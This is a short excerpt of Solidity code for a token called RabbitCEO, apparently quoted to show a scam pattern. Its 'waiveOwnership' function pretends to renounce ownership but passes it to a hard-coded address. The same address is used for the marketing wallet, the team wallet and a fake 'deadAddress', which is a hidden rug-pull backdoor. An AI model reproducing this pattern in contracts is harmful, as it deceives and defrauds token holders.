...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xFdD73691058b04Bc8c871801b66e0db15f8E8Ed5));
        _owner = address(0xFdD73691058b04Bc8c871801b66e0db15f8E8Ed5);
    }
...
contract RabbitCEO is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xFdD73691058b04Bc8c871801b66e0db15f8E8Ed5);
    address payable public teamWalletAddress = payable(0xFdD73691058b04Bc8c871801b66e0db15f8E8Ed5);
    address public immutable deadAddress = 0xFdD73691058b04Bc8c871801b66e0db15f8E8Ed5;
